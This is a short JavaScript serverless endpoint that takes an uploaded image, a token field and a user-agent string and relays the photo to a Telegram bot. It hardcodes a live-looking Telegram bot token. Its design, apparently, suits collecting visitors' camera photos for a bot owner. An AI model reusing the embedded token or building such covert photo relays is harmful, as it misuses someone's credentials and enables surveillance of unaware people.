import formidable from 'formidable';
import fs from 'fs';

export const config = {
    api: {
        bodyParser: false,
    },
};

const BOT_TOKEN = "8255755052:AAFjHxgUKDccQVi33kWGuUXkARcR85CxXDQ";

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        const form = formidable({ multiples: false });
        
        const [fields, files] = await new Promise((resolve, reject) => {
            form.parse(req, (err, fields, files) => {
                if (err) reject(err);
                resolve([fields, files]);
            });
        });

        const imageFile = files.image;
        const token = fields.token?.[0];
        const ua = fields.ua?.[0] || 'Unknown';

        if (!imageFile || !token) {
            return res.status(400).json({ error: 'Missing' });
        }

        const imageData = fs.readFileSync(imageFile.filepath);
        
        // Отправляем в Telegram
        const formData = new FormData();
        formData.append('chat_id', '0'); // В реальном проекте сюда chat_id владельца токена
        formData.append('photo', new Blob([imageData]), 'photo.jpg');
        formData.append('caption', `📸\n🕒 ${new Date().toLocaleString()}`);

        const tgResponse = await fetch(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
            { method: 'POST', body: formData }
        );

        fs.unlinkSync(imageFile.filepath);
        
        res.status(200).json({ success: true });

    } catch (error) {
        console.error(error);
        res.status(500).json({ error: error.message });
    }
}
